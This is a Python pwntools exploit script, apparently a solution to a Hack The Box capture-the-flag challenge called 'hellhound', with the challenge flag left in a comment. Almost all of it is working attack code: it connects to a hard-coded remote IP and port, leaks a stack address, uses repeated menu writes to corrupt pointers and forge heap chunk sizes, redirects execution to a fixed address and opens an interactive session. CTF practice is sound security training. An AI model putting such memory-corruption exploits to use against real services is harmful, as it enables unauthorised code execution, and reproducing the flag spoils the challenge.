#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 4141 ./hellhound
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./hellhound_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '206.189.126.72'
port = int(args.PORT or 31259)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x0000000000400db3
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  './.glibc/'

io = start()

io.sendlineafter(">> ","1")
io.recvuntil("ber: [")
leak = int(io.recvline()[:-2])
print(hex(leak))

io.sendlineafter(">> ","2")
p = 'a'*8
p += p64(leak+0x50)
io.sendlineafter(": ",p)

io.sendlineafter(">> ","3")

io.sendlineafter(">> ","2")
p = p64(0x0000000000400977)
p += p64(leak+0x8)
io.sendlineafter(": ",p)

io.sendlineafter(">> ","3")

io.sendlineafter(">> ","2")
p = p64(0)
p += p64(leak+0x10)
io.sendlineafter(": ",p)

io.sendlineafter(">> ","3")

io.sendlineafter(">> ","2")
p = p64(0x21)
p += p64(leak+0x18)
io.sendlineafter(": ",p)

io.sendlineafter(">> ","3")

io.sendlineafter(">> ","2")
p = p64(0x41)
p += p64(0)
p += p64(0)
p += p64(0x20fb0)
io.sendlineafter(": ",p)

io.sendlineafter(">> ","69")

# HTB{1t5_5p1r1t_15_5tr0ng3r_th4n_m0d1f1c4t10n5}
io.interactive()

